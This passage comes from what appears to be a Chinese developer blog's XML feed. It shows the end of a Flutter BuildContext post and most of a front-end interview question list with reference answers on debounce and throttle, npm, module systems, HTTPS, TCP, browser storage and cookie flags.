title="BuildContext"></a>BuildContext</h2><p>每次我们在编写界面部分代码的时候，都是在build函数中进行操作。而build函数则需要默认传入一个BuildContext。我们来看看这到底是啥</p><pre class="line-numbers language-js"><code class="language-js">abstract <span class="token keyword">class</span> <span class="token class-name">BuildContext</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/// The current configuration of the [Element] that is this [BuildContext].</span>  Widget <span class="token keyword">get</span> widget<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/// The [BuildOwner] for this context. The [BuildOwner] is in charge of</span>  <span class="token comment" spellcheck="true">/// managing the rendering pipeline for this context.</span>  BuildOwner <span class="token keyword">get</span> owner<span class="token punctuation">;</span>  <span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到BuildContext其实是一个抽象类，但是每次build函数传进来的是什么呢。我们来看看构建视图的时候到底发生了什么。</p>]]></content>
      
      
      <categories>
          
          <category> flutter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> Navigator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端经典面试题大全</title>
      <link href="2019/09/15/mianshi/"/>
      <url>2019/09/15/mianshi/</url>
      
        <content type="html"><![CDATA[<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><h3 id="1、什么是防抖和节流？有什么区别？如何实现？"><a href="#1、什么是防抖和节流？有什么区别？如何实现？" class="headerlink" title="1、什么是防抖和节流？有什么区别？如何实现？"></a>1、什么是防抖和节流？有什么区别？如何实现？</h3><p><code>参考答案</code></p><p><strong>防抖</strong></p><blockquote><p>触发高频事件后n秒内函数只会执行一次，如果n秒内高频事件再次被触发，则重新计算时间</p></blockquote><ul><li>思路：</li></ul><blockquote><p>每次触发事件时都取消之前的延时调用方法</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 创建一个标记用来存放定时器的返回值</span>      <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 每当用户输入的时候把前一个 setTimeout clear 掉</span>        timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 然后又创建一个新的 setTimeout, 这样就能保证输入字符后的 interval 间隔内如果还有字符输入的话，就不会执行 fn 函数</span>          fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'防抖成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> inp <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'inp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inp<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token function">debounce</span><span class="token punctuation">(</span>sayHi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 防抖</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>节流</strong></p><blockquote><p>高频事件触发，但在n秒内只会执行一次，所以节流会稀释函数的执行频率</p></blockquote><ul><li>思路：</li></ul><blockquote><p>每次触发事件时都判断当前是否有等待执行的延时函数</p></blockquote><pre><code>function throttle(fn) {      let canRun = true; // 通过闭包保存一个标记      return function () {        if (!canRun) return; // 在函数开头判断标记是否为true，不为true则return        canRun = false; // 立即设置为false        setTimeout(() =&gt; { // 将外部传入的函数的执行放在setTimeout中          fn.apply(this, arguments);          // 最后在setTimeout执行完毕后再把标记设置为true(关键)表示可以执行下一次循环了。当定时器没有执行的时候标记永远是false，在开头被return掉          canRun = true;        }, 500);      };    }    function sayHi(e) {      console.log(e.target.innerWidth, e.target.innerHeight);    }    window.addEventListener(&#39;resize&#39;, throttle(sayHi));</code></pre><h3 id="2、-get请求传参长度的误区、get和post请求在缓存方面的区别"><a href="#2、-get请求传参长度的误区、get和post请求在缓存方面的区别" class="headerlink" title="2、 get请求传参长度的误区、get和post请求在缓存方面的区别"></a>2、 get请求传参长度的误区、get和post请求在缓存方面的区别</h3><p><strong>误区：我们经常说get请求参数的大小存在限制，而post请求的参数大小是无限制的。</strong></p><p><code>参考答案</code></p><p>实际上HTTP 协议从未规定 GET/POST 的请求长度限制是多少。对get请求参数的限制是来源与浏览器或web服务器，浏览器或web服务器限制了url的长度。为了明确这个概念，我们必须再次强调下面几点:</p><ul><li>HTTP 协议 未规定 GET 和POST的长度限制</li><li>GET的最大长度显示是因为 浏览器和 web服务器限制了 URI的长度</li><li>不同的浏览器和WEB服务器，限制的最大长度不一样</li><li>要支持IE，则最大长度为2083byte，若只支持Chrome，则最大长度 8182byte</li></ul><p>补充补充一个get和post在缓存方面的区别：</p><ul><li>get请求类似于查找的过程，用户获取数据，可以不用每次都与数据库连接，所以可以使用缓存。</li><li>post不同，post做的一般是修改和删除的工作，所以必须与数据库交互，所以不能使用缓存。因此get请求适合于请求缓存。</li></ul><h3 id="3、模块化发展历程"><a href="#3、模块化发展历程" class="headerlink" title="3、模块化发展历程"></a>3、模块化发展历程</h3><p>可从IIFE、AMD、CMD、CommonJS、UMD、webpack(require.ensure)、ES Module、<code>&lt;script type=&quot;module&quot;&gt;</code> 这几个角度考虑。</p><p><code>参考答案</code></p><p>模块化主要是用来抽离公共代码，隔离作用域，避免变量冲突等。</p><p><strong>IIFE</strong>： 使用自执行函数来编写模块化，特点：<strong>在一个单独的函数作用域中执行代码，避免变量冲突</strong>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    data<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>AMD</strong>： 使用requireJS 来编写模块化，特点：<strong>依赖必须提前声明好</strong>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// code 就是index.js 返回的内容</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>CMD</strong>： 使用seaJS 来编写模块化，特点：<strong>支持动态引入依赖文件</strong>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">define</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>require<span class="token punctuation">,</span> exports<span class="token punctuation">,</span> module<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> indexCode <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>CommonJS</strong>： nodejs 中自带的模块化。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>UMD</strong>：兼容AMD，CommonJS 模块化语法。</p><p><strong>webpack(require.ensure)</strong>：webpack 2.x 版本中的代码分割。</p><p><strong>ES Modules</strong>： ES6 引入的模块化，支持import 来引入另一个 js 。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> a <span class="token keyword">from</span> <span class="token string">'a'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、npm-模块安装机制，为什么输入-npm-install-就可以自动安装对应的模块？"><a href="#4、npm-模块安装机制，为什么输入-npm-install-就可以自动安装对应的模块？" class="headerlink" title="4、npm 模块安装机制，为什么输入 npm install 就可以自动安装对应的模块？"></a>4、npm 模块安装机制，为什么输入 npm install 就可以自动安装对应的模块？</h3><p><code>参考答案</code></p><h4 id="1-npm-模块安装机制："><a href="#1-npm-模块安装机制：" class="headerlink" title="1. npm 模块安装机制："></a>1. npm 模块安装机制：</h4><ul><li>发出<code>npm install</code>命令</li><li>查询node_modules目录之中是否已经存在指定模块<ul><li>若存在，不再重新安装</li><li>若不存在<ul><li>npm 向 registry 查询模块压缩包的网址</li><li>下载压缩包，存放在根目录下的<code>.npm</code>目录里</li><li>解压压缩包到当前项目的<code>node_modules</code>目录</li></ul></li></ul></li></ul><h4 id="2-npm-实现原理"><a href="#2-npm-实现原理" class="headerlink" title="2. npm 实现原理"></a>2. npm 实现原理</h4><p>输入 npm install 命令并敲下回车后，会经历如下几个阶段（以 npm 5.5.1 为例）：</p><ol><li><p><strong>执行工程自身 preinstall</strong>  </p><p>当前 npm 工程如果定义了 preinstall 钩子此时会被执行。</p></li><li><p><strong>确定首层依赖模块</strong>  </p><p>首先需要做的是确定工程中的首层依赖，也就是 dependencies 和 devDependencies 属性中直接指定的模块（假设此时没有添加 npm install 参数）。</p><p>工程本身是整棵依赖树的根节点，每个首层依赖模块都是根节点下面的一棵子树，npm 会开启多进程从每个首层依赖模块开始逐步寻找更深层级的节点。</p></li><li><p><strong>获取模块</strong>  </p><p>获取模块是一个递归的过程，分为以下几步：</p><ul><li>获取模块信息。在下载一个模块之前，首先要确定其版本，这是因为 package.json 中往往是 semantic version（semver，语义化版本）。此时如果版本描述文件（npm-shrinkwrap.json 或 package-lock.json）中有该模块信息直接拿即可，如果没有则从仓库获取。如 packaeg.json 中某个包的版本是 ^1.1.0，npm 就会去仓库中获取符合 1.x.x 形式的最新版本。</li><li>获取模块实体。上一步会获取到模块的压缩包地址（resolved 字段），npm 会用此地址检查本地缓存，缓存中有就直接拿，如果没有则从仓库下载。</li><li>查找该模块依赖，如果有依赖则回到第1步，如果没有则停止。</li></ul></li><li><p><strong>模块扁平化（dedupe）</strong></p><p>上一步获取到的是一棵完整的依赖树，其中可能包含大量重复模块。比如 A 模块依赖于 loadsh，B 模块同样依赖于 lodash。在 npm3 以前会严格按照依赖树的结构进行安装，因此会造成模块冗余。</p><p>从 npm3 开始默认加入了一个 dedupe 的过程。它会遍历所有节点，逐个将模块放在根节点下面，也就是 node-modules 的第一层。当发现有<strong>重复模块</strong>时，则将其丢弃。</p><p>这里需要对<strong>重复模块</strong>进行一个定义，它指的是<strong>模块名相同</strong>且 <strong>semver 兼容。每个 semver 都对应一段版本允许范围，如果两个模块的版本允许范围存在交集，那么就可以得到一个兼容</strong>版本，而不必版本号完全一致，这可以使更多冗余模块在 dedupe 过程中被去掉。</p><p>比如 node-modules 下 foo 模块依赖 lodash@^1.0.0，bar 模块依赖 lodash@^1.1.0，则 <strong>^1.1.0</strong> 为兼容版本。</p><p>而当 foo 依赖 lodash@^2.0.0，bar 依赖 lodash@^1.1.0，则依据 semver 的规则，二者不存在兼容版本。会将一个版本放在 node_modules 中，另一个仍保留在依赖树里。</p><p>举个例子，假设一个依赖树原本是这样：</p><p>node_modules<br>– foo<br>—- lodash@version1</p><p>– bar<br>—- lodash@version2</p><p>假设 version1 和 version2 是兼容版本，则经过 dedupe 会成为下面的形式：</p><p>node_modules<br>– foo</p><p>– bar</p><p>– lodash（保留的版本为兼容版本）</p><p>假设 version1 和 version2 为非兼容版本，则后面的版本保留在依赖树中：</p><p>node_modules<br>– foo<br>– lodash@version1</p><p>– bar<br>—- lodash@version2</p></li><li><p><strong>安装模块</strong></p><p>这一步将会更新工程中的 node_modules，并执行模块中的生命周期函数（按照 preinstall、install、postinstall 的顺序）。</p></li><li><p><strong>执行工程自身生命周期</strong></p><p>当前 npm 工程如果定义了钩子此时会被执行（按照 install、postinstall、prepublish、prepare 的顺序）。</p><p>最后一步是生成或更新版本描述文件，npm install 过程完成。</p></li></ol><h3 id="5、ES5的继承和ES6的继承有什么区别？"><a href="#5、ES5的继承和ES6的继承有什么区别？" class="headerlink" title="5、ES5的继承和ES6的继承有什么区别？"></a>5、ES5的继承和ES6的继承有什么区别？</h3><p><code>参考答案</code></p><p>ES5的继承时通过prototype或构造函数机制来实现。<strong>ES5的继承实质上是先创建子类的实例对象，然后再将父类的方法添加到this上</strong>（Parent.apply(this)）。</p><p>ES6的继承机制完全不同，<strong>实质上是先创建父类的实例对象this（所以必须先调用父类的super()方法），然后再用子类的构造函数修改this</strong>。</p><p>具体的：ES6通过class关键字定义类，里面有构造方法，类之间通过extends关键字实现继承。子类必须在constructor方法中调用super方法，否则新建实例报错。因为子类没有自己的this对象，而是继承了父类的this对象，然后对其进行加工。如果不调用super方法，子类得不到this对象。</p><p>ps：super关键字指代父类的实例，即父类的this对象。在子类构造函数中，调用super后，才可使用this关键字，否则报错。</p><h3 id="6、setTimeout、Promise、Async-Await-的区别"><a href="#6、setTimeout、Promise、Async-Await-的区别" class="headerlink" title="6、setTimeout、Promise、Async/Await 的区别"></a>6、setTimeout、Promise、Async/Await 的区别</h3><p><a href="https://gongchenghuigch.github.io/2019/09/14/awat/">参考答案</a></p><h3 id="7、定时器的执行顺序或机制？"><a href="#7、定时器的执行顺序或机制？" class="headerlink" title="7、定时器的执行顺序或机制？"></a>7、定时器的执行顺序或机制？</h3><p><code>参考答案</code></p><p><strong>因为js是单线程的，浏览器遇到setTimeout或者setInterval会先执行完当前的代码块，在此之前会把定时器推入浏览器的待执行事件队列里面，等到浏览器执行完当前代码之后会看一下事件队列里面有没有任务，有的话才执行定时器的代码。</strong>所以即使把定时器的时间设置为0还是会先执行当前的一些代码。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> aa <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> testSet <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        aa<span class="token operator">++</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>aa<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">clearInterval</span><span class="token punctuation">(</span>testSet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> testSet1 <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">321</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre><code>test //10次undefined123321</code></pre><h3 id="8、-‘1’-’2’-’3’-map-parseInt-输出什么-为什么"><a href="#8、-‘1’-’2’-’3’-map-parseInt-输出什么-为什么" class="headerlink" title="8、[‘1’,’2’,’3’].map(parseInt) 输出什么,为什么?"></a>8、[‘1’,’2’,’3’].map(parseInt) 输出什么,为什么?</h3><p><code>参考答案</code>  </p><p>输出：<strong>[1, NaN, NaN]</strong></p><ul><li>首先让我们回顾一下，map函数的第一个参数callback：</li></ul><p><code>var new_array = arr.map(function callback(currentValue[, index[, array]]) { // Return element for new_array }[, thisArg])</code><br>这个callback一共可以接收三个参数，其中第一个参数代表当前被处理的元素，而第二个参数代表该元素的索引。</p><ul><li>而parseInt则是用来解析字符串的，使字符串成为指定基数的整数。<br><code>parseInt(string, radix)</code><br>接收两个参数，第一个表示被处理的值（字符串），第二个表示为解析时的基数。</li><li>了解这两个函数后，我们可以模拟一下运行情况</li></ul><ol><li>parseInt(‘1’, 0) //radix为0时，且string参数不以“0x”和“0”开头时，按照10为基数处理。这个时候返回1</li><li>parseInt(‘2’, 1) //基数为1（1进制）表示的数中，最大值小于2，所以无法解析，返回NaN</li><li>parseInt(‘3’, 2) //基数为2（2进制）表示的数中，最大值小于3，所以无法解析，返回NaN</li></ol><ul><li>map函数返回的是一个数组，所以最后结果为[1, NaN, NaN]</li></ul><h3 id="9、Doctype作用-严格模式与混杂模式如何区分？它们有何意义"><a href="#9、Doctype作用-严格模式与混杂模式如何区分？它们有何意义" class="headerlink" title="9、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?"></a>9、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h3><p><code>参考答案</code>  </p><p>Doctype声明于文档最前面，告诉浏览器以何种方式来渲染页面，这里有两种模式，严格模式和混杂模式。</p><ul><li>严格模式的排版和 JS 运作模式是 以该浏览器支持的最高标准运行。</li><li>混杂模式，向后兼容，模拟老式浏览器，防止浏览器无法兼容页面。</li></ul><h3 id="10、fetch发送2次请求的原因"><a href="#10、fetch发送2次请求的原因" class="headerlink" title="10、fetch发送2次请求的原因"></a>10、fetch发送2次请求的原因</h3><p><code>参考答案</code>  </p><p><strong>fetch发送post请求的时候，总是发送2次，第一次状态码是204，第二次才成功？</strong></p><p>原因很简单，因为你用fetch的post请求的时候，导致fetch 第一次发送了一个Options请求，询问服务器是否支持修改的请求头，如果服务器支持，则在第二次中发送真正的请求。</p><h2 id="http、浏览器对象"><a href="#http、浏览器对象" class="headerlink" title="http、浏览器对象"></a>http、浏览器对象</h2><h3 id="1、HTTPS-握手过程中，客户端如何验证证书的合法性"><a href="#1、HTTPS-握手过程中，客户端如何验证证书的合法性" class="headerlink" title="1、HTTPS 握手过程中，客户端如何验证证书的合法性"></a>1、HTTPS 握手过程中，客户端如何验证证书的合法性</h3><p><code>参考答案</code></p><ul><li><p>首先什么是HTTP协议?</p><p>http协议是超文本传输协议，位于tcp/ip四层模型中的应用层；通过请求/响应的方式在客户端和服务器之间进行通信；但是缺少安全性，http协议信息传输是通过明文的方式传输，不做任何加密，相当于在网络上裸奔；容易被中间人恶意篡改，这种行为叫做中间人攻击；</p></li><li><p>加密通信：</p><p>为了安全性，双方可以使用对称加密的方式key进行信息交流，但是这种方式对称加密秘钥也会被拦截，也不够安全，进而还是存在被中间人攻击风险；<br>于是人们又想出来另外一种方式，使用非对称加密的方式；使用公钥/私钥加解密；通信方A发起通信并携带自己的公钥，接收方B通过公钥来加密对称秘钥；然后发送给发起方A；A通过私钥解密；双发接下来通过对称秘钥来进行加密通信；但是这种方式还是会存在一种安全性；中间人虽然不知道发起方A的私钥，但是可以做到偷天换日，将拦截发起方的公钥key;并将自己生成的一对公/私钥的公钥发送给B；接收方B并不知道公钥已经被偷偷换过；按照之前的流程，B通过公钥加密自己生成的对称加密秘钥key2;发送给A；<br>这次通信再次被中间人拦截，尽管后面的通信，两者还是用key2通信，但是中间人已经掌握了Key2;可以进行轻松的加解密；还是存在被中间人攻击风险；</p></li><li><p>解决困境：权威的证书颁发机构CA来解决；</p><ul><li>制作证书：作为服务端的A，首先把自己的公钥key1发给证书颁发机构，向证书颁发机构进行申请证书；证书颁发机构有一套自己的公私钥，CA通过自己的私钥来加密key1,并且通过服务端网址等信息生成一个证书签名，证书签名同样使用机构的私钥进行加密；制作完成后，机构将证书发给A；</li><li>校验证书真伪：当B向服务端A发起请求通信的时候，A不再直接返回自己的公钥，而是返回一个证书；<br>说明：各大浏览器和操作系统已经维护了所有的权威证书机构的名称和公钥。B只需要知道是哪个权威机构发的证书，使用对应的机构公钥，就可以解密出证书签名；接下来，B使用同样的规则，生成自己的证书签名，如果两个签名是一致的，说明证书是有效的；<br>签名验证成功后，B就可以再次利用机构的公钥，解密出A的公钥key1;接下来的操作，就是和之前一样的流程了；</li><li>中间人是否会拦截发送假证书到B呢？<br>因为证书的签名是由服务器端网址等信息生成的，并且通过第三方机构的私钥加密中间人无法篡改； 所以最关键的问题是证书签名的真伪；</li></ul></li><li><p>https主要的思想是在http基础上增加了ssl安全层，即以上认证过程；</p></li></ul><h3 id="2、TCP三次握手和四次挥手"><a href="#2、TCP三次握手和四次挥手" class="headerlink" title="2、TCP三次握手和四次挥手"></a>2、TCP三次握手和四次挥手</h3><p><code>参考答案</code></p><p>三次握手之所以是三次是保证client和server均让对方知道自己的接收和发送能力没问题而保证的最小次数。</p><p>第一次client =&gt; server 只能server判断出client具备发送能力<br>第二次 server =&gt; client client就可以判断出server具备发送和接受能力。此时client还需让server知道自己接收能力没问题于是就有了第三次<br>第三次 client =&gt; server 双方均保证了自己的接收和发送能力没有问题</p><p>其中，为了保证后续的握手是为了应答上一个握手，每次握手都会带一个标识 seq，后续的ACK都会对这个seq进行加一来进行确认。</p><h3 id="3、img-iframe-script-来发送跨域请求有什么优缺点？"><a href="#3、img-iframe-script-来发送跨域请求有什么优缺点？" class="headerlink" title="3、img iframe script 来发送跨域请求有什么优缺点？"></a>3、<strong>img iframe script 来发送跨域请求有什么优缺点？</strong></h3><p><code>参考答案</code></p><ul><li>iframe</li></ul><p>优点：跨域完毕之后DOM操作和互相之间的JavaScript调用都是没有问题的</p><p>缺点：1.若结果要以URL参数传递，这就意味着在结果数据量很大的时候需要分割传递，巨烦。2.还有一个是iframe本身带来的，母页面和iframe本身的交互本身就有安全性限制。</p><ul><li>script</li></ul><p>优点：可以直接返回json格式的数据，方便处理</p><p>缺点：只接受GET请求方式</p><ul><li>图片ping</li></ul><p>优点：可以访问任何url，一般用来进行点击追踪，做页面分析常用的方法</p><p>缺点：不能访问响应文本，只能监听是否响应</p><h3 id="4、http和https的区别？"><a href="#4、http和https的区别？" class="headerlink" title="4、http和https的区别？"></a>4、http和https的区别？</h3><p><code>参考答案</code>  </p><p>http传输的数据都是未加密的，也就是明文的，网景公司设置了SSL协议来对http协议传输的数据进行加密处理，简单来说https协议是由http和ssl协议构建的可进行加密传输和身份认证的网络协议，比http协议的安全性更高。 主要的区别如下：</p><ul><li>Https协议需要ca证书，费用较高。</li><li>http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</li><li>使用不同的链接方式，端口也不同，一般而言，http协议的端口为80，https的端口为443</li><li>http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</li></ul><h3 id="5、什么是Bom？有哪些常用的Bom属性？"><a href="#5、什么是Bom？有哪些常用的Bom属性？" class="headerlink" title="5、什么是Bom？有哪些常用的Bom属性？"></a>5、什么是Bom？有哪些常用的Bom属性？</h3><p><code>参考答案</code></p><p> Bom是浏览器对象</p><p><strong>location对象</strong></p><ul><li>location.href– 返回或设置当前文档的URL </li><li>location.search – 返回URL中的查询字符串部分。例如 <a href="http://www.dreamdu.com/dreamdu.php?id=5&amp;name=dreamdu" target="_blank" rel="noopener">http://www.dreamdu.com/dreamdu.php?id=5&amp;name=dreamdu</a> 返回包括(?)后面的内容?id=5&amp;name=dreamdu </li><li>location.hash – 返回URL#后面的内容，如果没有#，返回空 location.host – 返回URL中的域名部分，例如<a href="http://www.dreamdu.com" target="_blank" rel="noopener">www.dreamdu.com</a> </li><li>location.hostname – 返回URL中的主域名部分，例如dreamdu.com </li><li>location.pathname – 返回URL的域名后的部分。例如 <a href="http://www.dreamdu.com/xhtml/" target="_blank" rel="noopener">http://www.dreamdu.com/xhtml/</a> 返回/xhtml/ </li><li>location.port – 返回URL中的端口部分。例如 <a href="http://www.dreamdu.com:8080/xhtml/" target="_blank" rel="noopener">http://www.dreamdu.com:8080/xhtml/</a> 返回8080 </li><li>location.protocol – 返回URL中的协议部分。例如 <a href="http://www.dreamdu.com:8080/xhtml/" target="_blank" rel="noopener">http://www.dreamdu.com:8080/xhtml/</a> 返回(//)前面的内容http:</li><li>location.assign – 设置当前文档的URL </li><li>location.replace() – 设置当前文档的URL，并且在history对象的地址列表中移除这个URL location.replace(url); </li><li>location.reload() – 重载当前页面</li></ul><p><strong>history对象</strong></p><ul><li>history.go() – 前进或后退指定的页面数 </li><li>history.go(num); history.back() – 后退一页 </li><li>history.forward() – 前进一页</li></ul><p><strong>Navigator对象</strong></p><ul><li>navigator.userAgent – 返回用户代理头的字符串表示(就是包括浏览器版本信息等的字符串) </li><li>navigator.cookieEnabled – 返回浏览器是否支持(启用)cookie</li></ul><h3 id="6、Cookie、sessionStorage、localStorage的区别"><a href="#6、Cookie、sessionStorage、localStorage的区别" class="headerlink" title="6、Cookie、sessionStorage、localStorage的区别"></a>6、Cookie、sessionStorage、localStorage的区别</h3><p><code>参考答案</code>  </p><p>共同点：都是保存在浏览器端，并且是同源的</p><ul><li>Cookie：cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下,存储的大小很小只有4K左右。 （key：可以在浏览器和服务器端来回传递，存储容量小，只有大约4K左右）</li><li>sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持，localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。（key：本身就是一个回话过程，关闭浏览器后消失，session为一个回话，当页面不同即使是同一页面打开两次，也被视为同一次回话）</li><li>localStorage：localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。（key：同源窗口都会共享，并且不会失效，不管窗口或者浏览器关闭与否都会始终生效）</li></ul><p>补充说明一下cookie的作用：</p><ul><li>保存用户登录状态。例如将用户id存储于一个cookie内，这样当用户下次访问该页面时就不需要重新登录了，现在很多论坛和社区都提供这样的功能。 cookie还可以设置过期时间，当超过时间期限后，cookie就会自动消失。因此，系统往往可以提示用户保持登录状态的时间：常见选项有一个月、三个 月、一年等。</li><li>跟踪用户行为。例如一个天气预报网站，能够根据用户选择的地区显示当地的天气情况。如果每次都需要选择所在地是烦琐的，当利用了 cookie后就会显得很人性化了，系统能够记住上一次访问的地区，当下次再打开该页面时，它就会自动显示上次用户所在地区的天气情况。因为一切都是在后 台完成，所以这样的页面就像为某个用户所定制的一样，使用起来非常方便</li><li>定制页面。如果网站提供了换肤或更换布局的功能，那么可以使用cookie来记录用户的选项，例如：背景色、分辨率等。当用户下次访问时，仍然可以保存上一次访问的界面风格。</li></ul><h3 id="7、Cookie如何防范XSS攻击"><a href="#7、Cookie如何防范XSS攻击" class="headerlink" title="7、Cookie如何防范XSS攻击"></a>7、Cookie如何防范XSS攻击</h3><p><code>参考答案</code>  </p><p>XSS（跨站脚本攻击）是指攻击者在返回的HTML中嵌入javascript脚本，为了减轻这些攻击，需要在HTTP头部配上，set-cookie：</p><ul><li>httponly-这个属性可以防止XSS,它会禁止javascript脚本来访问cookie。</li><li>secure - 这个属性告诉浏览器仅在请求为https的时候发送cookie。</li></ul><p>结果应该是这样的：Set-Cookie=…..</p><h3 id="8、浏览器和-Node-事件循环的区别？"><a 